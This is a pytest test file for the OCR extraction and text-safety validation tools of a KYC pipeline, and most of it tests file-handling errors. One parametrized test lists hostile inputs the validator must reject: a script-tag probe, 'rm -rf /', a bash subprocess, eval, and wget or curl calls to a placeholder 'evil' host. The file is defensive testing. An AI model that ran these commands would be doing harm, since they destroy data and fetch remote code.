import io
import os
import json
import tempfile
import numpy as np
import pytest

import cv2

# Adjust the import path if your module name is different
from kyc_pipeline.tools.ocr import (
    ocr_extract,
    validate_ocr_text_safety,
    MAX_FILE_SIZE_MB,
)

# -------- Helpers --------
def _write_png(path: str, w=60, h=40):
    """Create a valid small PNG using OpenCV."""
    img = np.full((h, w, 3), 255, dtype=np.uint8)  # white
    assert cv2.imwrite(path, img), "Failed to write test PNG image"


# -------- Tests for validate_ocr_text_safety --------
@pytest.mark.parametrize("bad", [
    "<script>alert(1)</script>",
    "os.system('rm -rf /')",
    "subprocess.Popen('bash')",
    "eval('1+1')",
    "wget http://evil",
    "curl http://evil",
    "import os",
])
def test_validate_ocr_text_safety_blocks_malicious(bad):
    with pytest.raises(ValueError):
        validate_ocr_text_safety(bad)


def test_validate_ocr_text_safety_sanitizes_control_and_spaces():
    raw = "  A\x00B\t\tC \n"
    # Control chars (\x00, \t, \n) are removed, then spaces are collapsed & stripped
    assert validate_ocr_text_safety(raw) == "ABC"



# -------- Happy path (PNG image) --------
def test_ocr_extract_png_success_func_and_run(tmp_path, monkeypatch):
    png_path = tmp_path / "sample.png"
    _write_png(str(png_path))

    # Make OCR deterministic and safe without invoking real Tesseract
    monkeypatch.setattr(
        "kyc_pipeline.tools.ocr.pytesseract.image_to_string",
        lambda *args, **kwargs: "Hello\t World\n"  # should sanitize -> "Hello World"
    )

    # call underlying function first
    out_func = ocr_extract.func(str(png_path))
    assert isinstance(out_func, str)
    assert out_func == "Hello World"

    # run via tool runner too
    out_run = ocr_extract.run(str(png_path))
    assert out_run == out_func


# -------- Error: file not found --------
def test_ocr_extract_file_not_found():
    with pytest.raises(FileNotFoundError):
        ocr_extract.func("/no/such/file.png")


# -------- Error: file too large --------
def test_ocr_extract_file_too_large(tmp_path):
    big_path = tmp_path / "big.png"
    # Create a file just over MAX_FILE_SIZE_MB
    with open(big_path, "wb") as f:
        f.write(b"\0" * (MAX_FILE_SIZE_MB * 1024 * 1024 + 1))

    with pytest.raises(ValueError) as ei:
        ocr_extract.func(str(big_path))
    assert "File too large" in str(ei.value)


# -------- Error: unsupported mime --------
def test_ocr_extract_unsupported_mime(tmp_path):
    bad_path = tmp_path / "weird.bin"   # mimetypes -> application/octet-stream
    bad_path.write_bytes(b"not an image")
    with pytest.raises(ValueError) as ei:
        ocr_extract.func(str(bad_path))
    assert "Unsupported file type" in str(ei.value)


# -------- Error: corrupted image (read returns None) --------
def test_ocr_extract_corrupted_image(tmp_path):
    # Extension makes mimetypes think it's PNG (allowed), but contents are invalid
    corrupt_png = tmp_path / "broken.png"
    corrupt_png.write_bytes(b"definitely-not-a-real-png")
    with pytest.raises(ValueError) as ei:
        ocr_extract.func(str(corrupt_png))
    assert "Unable to read image" in str(ei.value)


def test_ocr_extract_pdf_requires_pymupdf(tmp_path, monkeypatch):
    pdf_path = tmp_path / "doc.pdf"
    pdf_path.write_bytes(b"%PDF-1.4\n%...")  # just to exist

    # Force the module path to behave as if PyMuPDF isn't installed
    monkeypatch.setattr("kyc_pipeline.tools.ocr.fitz", None, raising=False)

    with pytest.raises(RuntimeError) as ei:
        ocr_extract.func(str(pdf_path))
    assert "PyMuPDF" in str(ei.value)

